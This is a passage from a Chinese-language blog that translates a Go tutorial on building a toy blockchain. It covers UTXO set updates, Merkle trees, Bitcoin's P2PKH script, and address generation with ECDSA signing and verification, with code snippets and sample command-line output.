tx.Bucket([]byte(utxoBucket)) for _, tx := range block.Transactions { if tx.IsCoinbase() == false { for _, vin := range tx.Vin { updatedOuts := TXOutputs{} outsBytes := b.Get(vin.Txid) outs := DeserializeOutputs(outsBytes) for outIdx, out := range outs.Outputs { if outIdx != vin.Vout { updatedOuts.Outputs = append(updatedOuts.Outputs, out) } } if len(updatedOuts.Outputs) == 0 { err := b.Delete(vin.Txid) } else { err := b.Put(vin.Txid, updatedOuts.Serialize()) } } } newOutputs := TXOutputs{} for _, out := range tx.Vout { newOutputs.Outputs = append(newOutputs.Outputs, out) } err := b.Put(tx.ID, newOutputs.Serialize()) } }) } 这个函数看起来比较庞大，但是它所做的是非常直接的。当一个新的区块被挖出来时，这个UTXO集合应该被更新。更新意味着移除已花费出账，同时添加从新挖出的交易中所得到的未花费输出。如果一个出账被移除的交易中，不再包含其他的出账，它就被完全移除了。非常简单！\n现在让我们在必要的地方使用UTXO集合吧：\nfunc (cli *CLI) createBlockchain(address string) { ... bc := CreateBlockchain(address) defer bc.db.Close() UTXOSet := UTXOSet{bc} UTXOSet.Reindex() ... } 一个索引的重建发生在一个新的区块链被创建时。例如现在，这里只有一个地方用到Reindex，虽然看起来有些多余在这里，因为在区块链的开始只有一个区块带有一个交易，同时可以用Update去替换它。但是我们可能需要这个重建索引机制在以后。（英语的语言组织规则怎么有点像山东话啊我觉得\u0026hellip;看看可以翻译成中式倒装这个句子\u0026hellip;）\nfunc (cli *CLI) send(from, to string, amount int) { ... newBlock := bc.MineBlock(txs) UTXOSet.Update(newBlock) } 然后UTXO集合在新的区块被挖出后更新：\n让我们检查一下它的工作：\n$ blockchain_go createblockchain -address 1JnMDSqVoHi4TEFXNw5wJ8skPsPf4LHkQ1 00000086a725e18ed7e9e06f1051651a4fc46a315a9d298e59e57aeacbe0bf73 Done! $ blockchain_go send -from 1JnMDSqVoHi4TEFXNw5wJ8skPsPf4LHkQ1 -to 12DkLzLQ4B3gnQt62EPRJGZ38n3zF4Hzt5 -amount 6 0000001f75cb3a5033aeecbf6a8d378e15b25d026fb0a665c7721a5bb0faa21b Success! $ blockchain_go send -from 1JnMDSqVoHi4TEFXNw5wJ8skPsPf4LHkQ1 -to 12ncZhA5mFTTnTmHq1aTPYBri4jAK8TacL -amount 4 000000cc51e665d53c78af5e65774a72fc7b864140a8224bf4e7709d8e0fa433 Success! $ blockchain_go getbalance -address 1JnMDSqVoHi4TEFXNw5wJ8skPsPf4LHkQ1 Balance of \u0026#39;1F4MbuqjcuJGymjcuYQMUVYB37AWKkSLif\u0026#39;: 20 $ blockchain_go getbalance -address 12DkLzLQ4B3gnQt62EPRJGZ38n3zF4Hzt5 Balance of \u0026#39;1XWu6nitBWe6J6v6MXmd5rhdP7dZsExbx\u0026#39;: 6 $ blockchain_go getbalance -address 12ncZhA5mFTTnTmHq1aTPYBri4jAK8TacL Balance of \u0026#39;13UASQpCR8Nr41PojH8Bz4K6cmTCqweskL\u0026#39;: 4 好噢！这个1JnMDSqVoHi4TEFXNw5wJ8skPsPf4LHkQ1地址接受了三次奖励：\n一次来自挖出创世纪块。 一次来自挖出区块0000001f75cb3a5033aeecbf6a8d378e15b25d026fb0a665c7721a5bb0faa21b。 一次来自挖出区块000000cc51e665d53c78af5e65774a72fc7b864140a8224bf4e7709d8e0fa433。 Merkle Tree（默克尔树） 这里有一个最好的机制我想在这部分讨论一下。\n正如我们上文所说的，全部的比特币数据库（或者说区块链）使用了超过140Gb的磁盘空间。由于比特币去中心化的特性，网络中的每个节点必须独立和自给自足，也就是说每个节点必须存储整个区块链的副本。随着更多的人开始使用比特币，这个规则变得很难去遵守：没有可能每个人都去运行全节点。同时，由于节点是网络的成熟的参与者，它们拥有责任：它们必须验证交易和区块。同时，它们需要有确切的互联网流量来与其他节点进行交互并且下载新的区块。\n在中本聪发布的比特币原始论文中，对这个问题有一个解决方案：简单支付验证（Simplified Payment Verification SPV）。SPV是一个轻节点，不需要下载全部的区块链也不需要对区块和交易进行验证。取而代之，它在区块中寻找交易（用来验证支付）同时连接到一个全节点检索必要的数据（也就是说轻节点需要某些数据时，可以从连接全节点，在上面下载）。这个机制允许多个轻钱包节点只运行一个全节点。\n为了让SPV成为可能，这就应该有一种检查一个区块是否包含特定的交易而不用下载整个区块的方法。这就是Merkle树所做的。\nMerkle树被比特币用来获取交易的哈希，也就是之后存储在区块头并且被工作量证明所考虑到。直到现在，我们仅仅连接了区块中每个交易的哈希然后对它们使用SHA-256方法。这也是一个很好的方式来获取区块交易的独一无二的特征值，但是没有Merkle树的优势。\n让我们看看Merkle树：\n一个Merkle树是为每一个区块建立的，它从叶节点开始（树的底部），一个叶子是一个交易哈希（比特币使用双重SHA256哈希算法）。叶节点的数目比必须是偶数，但是并不是每一个区块都包含偶数个数的交易。如果一个区块的交易数是奇数，那么最后一个交易将会被复制（在Merkle树中，不是区块中！）。\n离开底部，叶节点成对成组，它们的哈希被连接，同时一个新的哈希从它们相连的哈希得到。新的哈希组成新的树节点。这个步骤被重复执行直至仅剩一个节点，叫做树的根节点。这个根哈希被用做这些交易的独一无二的特征代表，被存储在区块头中，用于工作量证明程序。\n最后，写代码：\ntype MerkleTree struct { RootNode *MerkleNode } type MerkleNode struct { Left *MerkleNode Right *MerkleNode Data []byte } 我们从结构体开始。每一个MerkleNode（Merkle节点）维持数据并且连接到分支上。MerkleNode是真正的连接到下一个节点的根节点，又连接到更远的节点。\n让我们首先创建一个节点：\nfunc NewMerkleNode(left, right *MerkleNode, data []byte) *MerkleNode { mNode := MerkleNode{} if left == nil \u0026amp;\u0026amp; right == nil { hash := sha256.Sum256(data) mNode.Data = hash[:] } else { prevHashes := append(left.Data, right.Data...) hash := sha256.Sum256(prevHashes) mNode.Data = hash[:] } mNode.Left = left mNode.Right = right return \u0026amp;mNode } 每个节点包含一些数据。当一个节点是叶子时，数据在外界获得（我们的实例中是序列化的交易）。当一个节点连接到另一个节点时，它获取它们的数据并且连接它们然后进行哈希运算。\nfunc NewMerkleTree(data [][]byte) *MerkleTree { var nodes []MerkleNode if len(data)%2 != 0 { data = append(data, data[len(data)-1]) } for _, datum := range data { node := NewMerkleNode(nil, nil, datum) nodes = append(nodes, *node) } for i := 0; i \u0026lt; len(data)/2; i++ { var newLevel []MerkleNode for j := 0; j \u0026lt; len(nodes); j += 2 { node := NewMerkleNode(\u0026amp;nodes[j], \u0026amp;nodes[j+1], nil) newLevel = append(newLevel, *node) } nodes = newLevel } mTree := MerkleTree{\u0026amp;nodes[0]} return \u0026amp;mTree } 当一个新的树被创建，第一件事就是确定是否是偶数个叶子。在那之后，数据（一个序列化交易数组）被传入树叶子，然后树开始由这些叶子生长。\n现在，让我们修改Block.HashTransactions，在工作量证明中被使用来获取交易哈希：\nfunc (b *Block) HashTransactions() []byte { var transactions [][]byte for _, tx := range b.Transactions { transactions = append(transactions, tx.Serialize()) } mTree := NewMerkleTree(transactions) return mTree.RootNode.Data } 首先，交易被序列化（使用encoding/gob），然后它们被用来构建Merkle树。树的根节点被作为这些区块交易的独一无二的标识来存储。\nP2KH 这部分相当于扩展内容，有关比特币的脚本语言。我好困好想睡~就先转AnnatarHe的了。\n在细节上还有一点要说一下。\n你记得吗，在比特币种有一种脚本(Script)编程语言，它被用来锁定交易出账：交易入账提供数据去锁定出账。这个语言非常简单，语言的代码也就仅仅是数据和操作符的排列而已。看下这个例子：\n5 2 OP_ADD 7 OP_EQUAL 5, 2, 和 7 都是数据. OP_ADD 和 OP_EQUAL 是操作符。Script 的代码是从左至右执行的：数据的每一块都被塞进栈里然后下个操作会会被栈顶的元素调用。Script的栈只是一个简单的 FILO(先入后出)内存存储：栈中的第一个进去的元素会被最后一个拿走，之后进来的每个元素都是放到前一个的上面。\n来分解一下上面这个脚本执行的步骤吧：\n栈：空。脚本：5 2 OP_ADD 7 OP_EQUAL 栈：5。脚本：2 OP_ADD 7 OP_EQUAL 栈：5 2。脚本：OP_ADD 7 OP_EQUAL 栈：7。脚本：7 OP_EQUAL 栈：7 7。脚本：OP_EQUAL 栈：true。脚本：空 OP_ADD拿走栈上的两个元素，求和，然后把和再塞进栈里。OP_EQUAL从栈里拿两个元素，然后比较： 如果一样就把true 推到栈里，不一样就把false推进去。脚本执行的结果就是栈顶的值：在我们的场景下，它是 true，这就意味着脚本正常地成功执行了。\n现在来看一眼比特币中执行支付的脚本：\n\u0026lt;signature\u0026gt; \u0026lt;pubKey\u0026gt; OP_DUP OP_HASH160 \u0026lt;pubKeyHash\u0026gt; OP_EQUALVERIFY OP_CHECKSIG 这个脚本被称作付款给公钥哈希(Pay to Public Key Hash)(P2PKH)，这是比特币中最常用的脚本。它就是字面上的给公钥哈希付款的意思，它会用一个确定的公钥锁币。这是 比特币支付的核心：无账户，两者之间无资金交互；只有脚本去确认提供的数字签名和公钥是正确的。\n此脚本实质上存在两个部分：\n第一块。signature, pubKey存在入账的 ScriptSig 字段中。 第二部分。OP_DUP OP_HASH160 pubKeyHash OP_EQUALVERIFY OP_CHECKSIG存在出账的 ScriptPubKey 中。 所以，它是定义解锁逻辑的出账，也是提供数据区解锁出账的入账。来执行以下这个脚本：\n1 栈: empty 脚本: signature pubKey OP_DUP OP_HASH160 pubKeyHash OP_EQUALVERIFY OP_CHECKSIG\n2 栈: signature 脚本: pubKey OP_DUP OP_HASH160 pubKeyHash OP_EQUALVERIFY OP_CHECKSIG\n3 栈: signature pubKey 脚本: OP_DUP OP_HASH160 pubKeyHash OP_EQUALVERIFY OP_CHECKSIG\n4 栈: signature pubKey pubKey 脚本: OP_HASH160 pubKeyHash OP_EQUALVERIFY OP_CHECKSIG\n5 栈: signature pubKey pubKeyHash 脚本: pubKeyHash OP_EQUALVERIFY OP_CHECKSIG\n6 栈: signature pubKey pubKeyHash pubKeyHash 脚本: OP_EQUALVERIFY OP_CHECKSIG\n7 栈: signature pubKey 脚本: OP_CHECKSIG\n8 栈: true 或 false. Script: empty.\nOP_DUP 复制栈顶的一个元素. OP_HASH160 拿走栈顶的元素，并用 RIPEMD160 哈希一下; 再把结果塞到栈里. OP_EQUALVERIFY 对比栈顶的两个元素，如果不一样就中断脚本的执行. OP_CHECKSIG 通过哈希交易，还有 signature 和 pubKey 来验证交易的签名. 后面的一个操作颇为复杂: 它做了一个简版的交易副本, 对它哈希(因为这是被签名的交易哈希), 然后用提供的 signature 和 pubKey 验证签名.\n有了这样的脚本语言就允许比特币可以成为智能合约平台：这种语言是的除了穿衣单个秘钥之外的其他交易方式成为了可能。\n总结 好啦！我们几乎实现了以区块链为基础的加密货币的所有关键特性。我们有了区块链、地址、挖矿以及交易。但是还有一件事赋予这些所有机制生命，使区块链成为一个全局生态：一致性。在下一篇文章中，我们将开始实现区块链的“去中心化”部分。尽请期待！\nLinks:\nFull source codes The UTXO Set Merkle Tree Script “Ultraprune” Bitcoin Core commit UTXO set statistics Smart contracts and Bitcoin Why every Bitcoin user should understand “SPV security” ","date":"2019-09-17T12:35:12+08:00","permalink":"https://lizonglingo.github.io/p/%E4%BD%BF%E7%94%A8golang%E6%9E%84%E5%BB%BA%E5%8C%BA%E5%9D%97%E9%93%BEpart6%E4%BA%A4%E6%98%93-2/","title":"使用Golang构建区块链Part6：交易-2"},{"content":" 这一篇断断续续做了几天才得以实现，由于文章篇幅限制，作者只将新版本代码中最重要的最有代表性的改变在博客中进行分析。但是仍然有较多的代码需要大家根据compare进行自己细读。我们今天来进行“地址”的实现。\n引言 在前面的文章中，我们实现了交易。你也了解到了交易的客观性：这里没有账户，你的个人数据（例如姓名、护照号码、社保号）在比特币中是不需要的，同时也是不会存储的。但是这里仍然必须有点什么东西可以标识你是交易输出的所有者（这些币的所有者锁住这些输出）。同时，这也是需要比特币地址的原因。不久之前我们使用用户定义字符串作为地址，这一次我们要实现真正的地址，就像比特币中实现的那样。\n这部分有重大的代码变化，所要没有必要全部解释。可以参考这里 去看代码最新版本中的所有变动。\n比特币地址 这里是比特币地址的一个示例：1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa。这是比特币中的第一个地址，传言这个地址属于中本聪。比特币地址是公开的。如果你想给某个人发送币，你需要知道他的地址。但是地址（尽管是独一无二的）不是标识你是某个钱包的所有者。事实上，地址是人类可读公钥。在比特币中，你的身份就是一组（或几组）存储在你的计算机上（或者你可以访问的其他地方的）的公-私钥对的组合。比特币依赖一个密码学算法去创建这些钥匙，并且保证没有人可以不通过得到你的物理密钥而去获取你的币。下面让我们讨论一下这些算法。\n公钥加密 公钥加密使用了一组钥匙：公钥和私钥。公钥是非敏感的并且可以透露给所有人。与此相反，私钥不能被透露：除了所有者没有人可以访问它们，因为私钥就像所有者的身份标识。你是就你的私钥（在加密货币的范畴里）。\n事实上，比特币钱包就是一对钥匙。当你安装钱包应用或者使用比特币客户端去产生新的地址，一对钥匙就为你产生。在比特币中，谁控制了私钥谁就控制了进入这个钱包的所有币。\n私钥和公钥仅仅是随机序列，因此它们不能被打印到屏幕上也不能被人类所读。这就是为什么比特币使用算法去把公钥转换为一个人类可读字符串。\n如果你曾用过比特币钱包应用，它也可能给你生成提示词来助记为你产生的私钥。这个机制在BIP-039实现。\nPS：我翻的太烂了\u0026hellip;\nIf you’ve ever used a Bitcoin wallet application, it’s likely that a mnemonic pass phrase was generated for you. Such phrases are used instead of private keys and can be used to generate them. This mechanism is implemented in BIP-039.\n好了，我们现在知道比特币中怎么去辨别用户身份了。但是比特币中怎样检查交易输出的所有者呢（币是存在里面的吗）？\n数字签名 在数学和加密学中，这里有一个数字签名的概念-这个算法保证了：\n发送者发给接收者的数据不会被篡改； 数据由确定的发送者创建； 发送者不可以否定发送过数据。 通过对数据应用签名算法（或者是，对数据签名），一个人得到一个签名，很快就可以得到验证。数字签名使用私钥才可以进行，验证环节则需要公钥。\n为了对数据进行签名，我们需要以下条件：\n需要被签名的数据； 私钥。 签名的操作产生一个签名，存储在交易输入中。为了去验证签名，下面是我们需要的：\n被签名的数据； 签名； 公钥。 简单说，验证流程可以被描述为：检查签名是由被签名数据加上私钥得来，并且公钥恰好是由该私钥生成（这个公钥和私钥是配对的）。\n数字签名不是加密，你不能根据签名恢复（反推）出数据。这有些像哈希运算：你通过哈希算法运算数据，得到数据的一个独一无二的标识。签名和哈希运算的不同之处在于钥匙对：它们使得签名验证得以实现。但是钥匙对也可以用来加密数据：一个私钥用于加密数据，一个公钥用来解密数据。比特币并不使用加密算法\n比特币中每一笔交易输入被创建这个交易的人签名。比特币中每一笔交易在上链存储之前必须被验证。验证意味着（不包含其他流程）：\n确认上笔交易中的出账有权被使用； 检查交易签名是否合法。 图示，签名数据以及验证的流程如下：\n现在让我们回顾一下交易的整个生命周期：\n在一开始，这儿有个创世纪块包含了coinbase交易。这个coinbase交易没有真正的输入，所以对它进行签名是没有必要的。这个coinbase交易的输出包含一个进行哈希的公钥（这里使用了RIPEMD16(SHA256(PubKey))算法）。 当某个人发送币时，交易被创建。交易的输入依赖于前一个（几个）交易的输出。每个输入将存储一个公钥（没有被哈希过的）同时也存储整个交易的签名。 比特币网络的其他节点接受交易并进行验证。除此之外，他们将会检查：入账的公钥哈希是否和被引用的出账哈希一样(这就保证了提币的人只能提他自己的币); 签名是不是正确地(这就保证了这笔交易确实是被币的所有者所创建的)。 当矿工节点（挖矿节点）准备好挖一个新区块时，它将会把交易放进区块然后开始挖矿。 当区块被挖出，网络中其他每个节点接受一条区块已经挖出来并且加入区块链的信息。 在区块加入区块链后，交易完成，它的交易输出可以被新的交易所引用。 椭圆曲线加密 如前文所述，公钥和私钥是随机的字节序列。因为私钥是用来证明币的所有者身份的，这里有一个必须的条件：随机算法必须产生真正的随机字节。我们不想产生一个被别人所拥有的私钥（意思就是没有两个私钥是一样的）。\n比特币使用椭圆曲线去产生私钥。椭圆曲线是复杂的数学概念，在这里我们并不会去解释它的细节（如果你好奇，点击这里，⚠⚠⚠：很多数学公式！！！）。我们所需要知道的是这个曲线算法可以被用来产生真正庞大的和随机的数字。比特币所使用的曲线算法可以随意的产生一个范围在0到2²⁵⁶（大约是10⁷⁷，可见宇宙中的原子数在10⁷⁸到10⁸²）之间的数。如此巨大的上限意味着要产生两个相同的私钥几乎是不可能的。\n同时，比特币（我们也）使用了ECDSA（Elliptic Curve Digital Signature Algorithm（椭圆曲线数字签名算法））去对交易进行签名。\nBase58 现在我们回到上面所谈及的比特币地址：1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa。我们知道这是一个人类可读的公钥的一个标识。如果我们对其进行解码，这个公钥就看起来是这种（十六进制表示的一个字节序列）：\n0062E907B15CBF27D5425399EBF6F0FB50EBB88F18C29B7D93 比特币使用Base58算法对公钥进行人类可读的格式转化。这个算法与著名的Base64非常的相似，但是使用了更简短的字母表：一些字母被移出，这是为了避免一些使用相似字母的攻击。因此，这里没有这些符号：0（数字0）、O（大写字母o）、I（大写字母i）、l（小写字母L），因为这些看起来很相似。同时，这里也没有“+”和“/”符号。\n让我们根据图形象的看一下从公钥中获取地址的步骤：\n上面所说的解码公钥由下面三个部分组成：\nVersion Public key hash Checksum 00 62E907B15CBF27D5425399EBF6F0FB50EBB88F18 C29B7D93 因为哈希函数是单向的（即不能反向解码出元数据），它不可能从哈希中提取出公钥。但是我们可以检查这个公钥是否用来生成哈希，即通过执行哈希函数进行比较。\n好啦，这是我们所有部分，让我们写一些代码。一些概念当coding时会更加的清晰。\n实现地址 我们从Wallet钱包结构体开始：\ntype Wallet struct { PrivateKey ecdsa.PrivateKey PublicKey []byte } type Wallets struct { Wallets map[string]*Wallet } func NewWallet() *Wallet { private, public := newKeyPair() wallet := Wallet{private, public} return \u0026amp;wallet } func newKeyPair() (ecdsa.PrivateKey, []byte) { curve := elliptic.P256() private, err := ecdsa.GenerateKey(curve, rand.Reader) pubKey := append(private.PublicKey.X.Bytes(), private.PublicKey.Y.Bytes()...) return *private, pubKey } 一个钱包除了了一个钥匙对之外什么都没有。我们也需要Wallets结构体去存储钱包的集合，把它们保存在一个文件中，并可以从文件中加载。在Wallet的构造方法中会产生一个新的钥匙对。这个newKeyPair函数是非常明确的：ECDSA是基于椭圆曲线，所以我们需要一个。接下来，通过曲线算法产生一个私钥，然后公钥由私钥产生。需要注意的一件事情是：在椭圆曲线基础算法中，公钥是指向一条曲线的。因此，一个公钥是由X、Y坐标组合而成的。在比特币中，这些坐标相连接然后组成一个公钥。\n现在，让我们产生一个地址：\nfunc (w Wallet) GetAddress() []byte { pubKeyHash := HashPubKey(w.PublicKey) versionedPayload := append([]byte{version}, pubKeyHash...) checksum := checksum(versionedPayload) fullPayload := append(versionedPayload, checksum...) address := Base58Encode(fullPayload) return address } func HashPubKey(pubKey []byte) []byte { publicSHA256 := sha256.Sum256(pubKey) RIPEMD160Hasher := ripemd160.New() _, err := RIPEMD160Hasher.Write(publicSHA256[:]) publicRIPEMD160 := RIPEMD160Hasher.Sum(nil) return publicRIPEMD160 } func checksum(payload []byte) []byte { firstSHA := sha256.Sum256(payload) secondSHA := sha256.Sum256(firstSHA[:]) return secondSHA[:addressChecksumLen] } 这里是将一个公钥转化成一个Base58地址的步骤：\n获得公钥并使用__RIPEMD160(SHA256(PubKey))__哈希算法将其哈希两次。 为哈希运算准备地址生成算法的版本。 通过对第二步中的结果使用__SHA256(SHA256(payload))__计算校验和。校验和是结果哈希最开始四个字节。 添加校验和到__version+PubKeyHash__组合。 用__Base58__为__version + PubKeyHash + checksum__的组合进行编码。 作为结果，你将会得到真正的比特币地址，你甚至可以在blockchain.info中查看它的余额。但是我敢保证你的余额是零，不管你创建多少个新地址检查多少次余额。这就是为什么适当的选择公钥加密算法重要的原因：考虑到私钥是随机数据，产生相同数字必须是可能性极低的。理想情况下，必须低到“不可能”的程度。\n同时，要注意你不需要连接比特币节点去获得一个地址。地址生成算法利用开源算法的组合，它在很多程序设计语言和库中都有实现。\n现在我们需要使用地址对出账和入账进行一些修改：\ntype TXInput struct { Txid []byte Vout int Signature []byte PubKey []byte } func (in *TXInput) UsesKey(pubKeyHash []byte) bool { lockingHash := HashPubKey(in.PubKey) return bytes.Compare(lockingHash, pubKeyHash) == 0 } type TXOutput struct { Value int PubKeyHash []byte } func (out *TXOutput) Lock(address []byte) { pubKeyHash := Base58Decode(address) pubKeyHash = pubKeyHash[1 : len(pubKeyHash)-4] out.PubKeyHash = pubKeyHash } func (out *TXOutput) IsLockedWithKey(pubKeyHash []byte) bool { return bytes.Compare(out.PubKeyHash, pubKeyHash) == 0 } 注意，现在我们不再使用__ScriptPubKey__和__ScriptSig__字段，因为我们不会去实现一个脚本语言。代替的，__ScriptSig__被分成__Signature__和__PubKey__字段，ScriptPubKey__被重命名为__PubKeyHash。我们将会像比特币一样实现相同的出账的加锁和解锁以及入账签名逻辑，但我们会使用函数方法代替。\n这个UsesKey方法使用特殊的钥匙去解锁出账来检查入账。注意这个入账存储一个未经加工的公钥（或者说是没有经过哈希运算的），但是需要一个哈希函数。IsLockedWithKey检查是否提供了一个公钥哈希来对出账加锁。这是一个和UsesKey函数的一个互补函数，而且它们同时使用FindUnspentTransactions去在交易间建立连接。\nLock简单地锁住了一个输出。当我们给某人发送一些币时，我们知道他的地址，因此这个函数需要地址作为唯一的参数。这个地址接着被解码，从中提取出公钥哈希然后保存在__PubKeyHash__字段中。\n现在，让我们检查一下程序是否可以正常工作：\n$ blockchain_go createwallet Your new address: 13Uu7B1vDP4ViXqHFsWtbraM3EfQ3UkWXt $ blockchain_go createwallet Your new address: 15pUhCbtrGh3JUx5iHnXjfpyHyTgawvG5h $ blockchain_go createwallet Your new address: 1Lhqun1E9zZZhodiTqxfPQBcwr1CVDV2sy $ blockchain_go createblockchain -address 13Uu7B1vDP4ViXqHFsWtbraM3EfQ3UkWXt 0000005420fbfdafa00c093f56e033903ba43599fa7cd9df40458e373eee724d Done! $ blockchain_go getbalance -address 13Uu7B1vDP4ViXqHFsWtbraM3EfQ3UkWXt Balance of \u0026#39;13Uu7B1vDP4ViXqHFsWtbraM3EfQ3UkWXt\u0026#39;: 10 $ blockchain_go send -from 15pUhCbtrGh3JUx5iHnXjfpyHyTgawvG5h -to 13Uu7B1vDP4ViXqHFsWtbraM3EfQ3UkWXt -amount 5 2017/09/12 13:08:56 ERROR: Not enough funds $ blockchain_go send -from 13Uu7B1vDP4ViXqHFsWtbraM3EfQ3UkWXt -to 15pUhCbtrGh3JUx5iHnXjfpyHyTgawvG5h -amount 6 00000019afa909094193f64ca06e9039849709f5948fbac56cae7b1b8f0ff162 Success! $ blockchain_go getbalance -address 13Uu7B1vDP4ViXqHFsWtbraM3EfQ3UkWXt Balance of \u0026#39;13Uu7B1vDP4ViXqHFsWtbraM3EfQ3UkWXt\u0026#39;: 4 $ blockchain_go getbalance -address 15pUhCbtrGh3JUx5iHnXjfpyHyTgawvG5h Balance of \u0026#39;15pUhCbtrGh3JUx5iHnXjfpyHyTgawvG5h\u0026#39;: 6 $ blockchain_go getbalance -address 1Lhqun1E9zZZhodiTqxfPQBcwr1CVDV2sy Balance of \u0026#39;1Lhqun1E9zZZhodiTqxfPQBcwr1CVDV2sy\u0026#39;: 0 虽然完成这些还需要修改更多的代码，仅仅修改上述部分是运行不出来的。具体参照源码。\n好的！现在让我们实现交易签名。\n实现签名 交易必须被签名，因为这是比特币中唯一一个途径来保证一个人不能花费不属于他的币。如果一个签名不合法，那么这个交易也被认为是不合法的，因此不能够添加到区块链上。\n我们有实现签名的所有部分了，只差一件事：对数据进行签名。交易的哪一部分是真正被签名的呢？或者一个交易是作为一个整体被签名的吗？选择数据去进行签名是非常重要的。这个事情就是被签名的数据必须是用一种独一无二的方式去标识数据的信息（也就是这个数据必须体现出这个交易的独一无二）。例如，仅仅对出账的币额进行签名是完全没有意义的因为这样的签名不会考虑到交易的发送者和接收者。\n考虑到交易解锁以前的出账，重新分配余额，并锁定新的交易，这下面是必须被签名的数据：\n存储在解锁的出账中的公钥哈希。这是交易发送者的身份标识。 新的、加锁的出账的公钥哈希。这是交易接收者的身份标识。 新的出账的额度。 在比特币中，加锁和解锁的逻辑是存储在脚本当中的，也就是分别存储在入账和出账的ScriptSig和ScriptPubKey字段。因为比特币允许这个脚本有不同的类型，它签名整个ScriptPubKey的内容。\n正如你所看到的，我们不需要对存储在入账中的公钥进行签名。正是这个原因，在比特币中，不是交易被签名，而是选择性的利用入账中存储的ScriptPubKey从相关的出账中复制。(PS:应该是没翻好\u0026hellip;原文：Because of this, in Bitcoin, it’s not a transaction that’s signed, but its trimmed copy with inputs storing ScriptPubKey from referenced outputs.)\n一个得到修建事务副本的细节程序在这里有描述。它很可能过时了，但是我找不到更可靠的数据来源了。\n好的，它看起来很复杂，所以让我们开始coding。我们将会从Sign方法开始：\nfunc (tx *Transaction) Sign(privKey ecdsa.PrivateKey, prevTXs map[string]Transaction) { if tx.IsCoinbase() { return } txCopy := tx.TrimmedCopy() for inID, vin := range txCopy.Vin { prevTx := prevTXs[hex.EncodeToString(vin.Txid)] txCopy.Vin[inID].Signature = nil txCopy.Vin[inID].PubKey = prevTx.Vout[vin.Vout].PubKeyHash txCopy.ID = txCopy.Hash() txCopy.Vin[inID].PubKey = nil r, s, err := ecdsa.Sign(rand.Reader, \u0026amp;privKey, txCopy.ID) signature := append(r.Bytes(), s.Bytes()...) tx.Vin[inID].Signature = signature } } 这个方法接受一个私钥和一个先前交易的map结构。正如前面提及的，为了去签名一个交易，我们需要根据交易的入账去获得引用的出账，因此我们需要交易存储这些出账。\n让我们重新一步步看：\nif tx.IsCoinbase() { return } 铸币交易不被签名因为这里没有真正的入账。\ntxCopy := tx.TrimmedCopy() 一个交易的裁剪副本会被签名，而不是整个交易被签名。\nfunc (tx *Transaction) TrimmedCopy() Transaction { var inputs []TXInput var outputs []TXOutput for _, vin := range tx.Vin { inputs = append(inputs, TXInput{vin.Txid, vin.Vout, nil, nil}) } for _, vout := range tx.Vout { outputs = append(outputs, TXOutput{vout.Value, vout.PubKeyHash}) } txCopy := Transaction{tx.ID, inputs, outputs} return txCopy } 这个副本会包含所有的输入和输出，但是TXInput.Signature以及TXInput.PubKey会被设置为空。\n接下来，我们对副本里每一个入账进行迭代：\nfor inID, vin := range txCopy.Vin { prevTx := prevTXs[hex.EncodeToString(vin.Txid)] txCopy.Vin[inID].Signature = nil txCopy.Vin[inID].PubKey = prevTx.Vout[vin.Vout].PubKeyHash 在每一个入账中，Signature被设置成空，同时PubKey被设置成所引用出账的PubKeyHash。在这种情况下，除了当前的交易其他交易都为“空”。因此__入账是单独签名的__，虽然这在我们的应用中没有必要，但是比特币中允许交易去包含入账所引用的不同的地址。\ntxCopy.ID = txCopy.Hash() txCopy.Vin[inID].PubKey = nil 这个Hash方法将交易进行序列化的同时使用SHA-256算法计算哈希。这个哈希的结果就是我们将要进行签名的数据。在得到哈希之后，我们应该重置PubKey字段，所以它不会影响进一步的迭代。\n现在，核心的部分：\nr, s, err := ecdsa.Sign(rand.Reader, \u0026amp;privKey, txCopy.ID) signature := append(r.Bytes(), s.Bytes()...) tx.Vin[inID].Signature = signature 我们使用privKey对txCopy.ID进行签名。一个椭圆曲线签名算法签名的是一对数字，就是我们连接并存储的入账的Signature字段。\n现在，是验证函数：\nfunc (tx *Transaction) Verify(prevTXs map[string]Transaction) bool { txCopy := tx.TrimmedCopy() curve := elliptic.P256() for inID, vin := range tx.Vin { prevTx := prevTXs[hex.EncodeToString(vin.Txid)] txCopy.Vin[inID].Signature = nil txCopy.Vin[inID].PubKey = prevTx.Vout[vin.Vout].PubKeyHash txCopy.ID = txCopy.Hash() txCopy.Vin[inID].PubKey = nil r := big.Int{} s := big.Int{} sigLen := len(vin.Signature) r.SetBytes(vin.Signature[:(sigLen / 2)]) s.SetBytes(vin.Signature[(sigLen / 2):]) x := big.Int{} y := big.Int{} keyLen := len(vin.PubKey) x.SetBytes(vin.PubKey[:(keyLen / 2)]) y.SetBytes(vin.PubKey[(keyLen / 2):]) rawPubKey := ecdsa.PublicKey{curve, \u0026amp;x, \u0026amp;y} if ecdsa.Verify(\u0026amp;rawPubKey, txCopy.ID, \u0026amp;r, \u0026amp;s) == false { return false } } return true } 这个函数非常的直接了当。首先，我们需要相同的交易副本：\ntxCopy := tx.TrimmedCopy() 接下来，我们需要同样的曲线用来生成钥匙对：\ncurve := elliptic.P256() 然后，我们检查每个入账的签名：\nfor inID, vin := range tx.Vin { prevTx := prevTXs[hex.EncodeToString(vin.Txid)] txCopy.Vin[inID].Signature = nil txCopy.Vin[inID].PubKey = prevTx.Vout[vin.Vout].PubKeyHash txCopy.ID = txCopy.Hash() txCopy.Vin[inID].PubKey = nil 这部分对唯一的签名方法是相同的，因为在验证过程中，我们需要签名的数据是相同的。\nr := big.Int{} s := big.Int{} sigLen := len(vin.Signature) r.SetBytes(vin.Signature[:(sigLen / 2)]) s.SetBytes(vin.Signature[(sigLen / 2):]) x := big.Int{} y := big.Int{} keyLen := len(vin.PubKey) x.SetBytes(vin.PubKey[:(keyLen / 2)]) y.SetBytes(vin.PubKey[(keyLen / 2):]) 这里是我们分析存储在TXInput.Signature和TXInput.PubKey中的数据，因为一个签名是一对数字并且公钥是一对坐标。我们为了存储它们而将它们过早的连接，而且现在我们需要解析它们用于``crypto/ecdsa` 函数。\nrawPubKey := ecdsa.PublicKey{curve, \u0026amp;x, \u0026amp;y} if ecdsa.Verify(\u0026amp;rawPubKey, txCopy.ID, \u0026amp;r, \u0026amp;s) == false{ return false } } return true 这里，我们使用了从入账中提取出了公钥创建了ecdsa.PublicKey并执行了ecdsa.Verify，参数是从入账提取出的签名。如果所有的入账都验证过了，就返回 true, 如果在输入的验证中有一个出错了，就返回false。\n现在，我们需要一个函数去获取先前的交易。因为这里需要与区块链进行交互，我们将构建Bolckchain的函数：\nfunc (bc *Blockchain) FindTransaction(ID 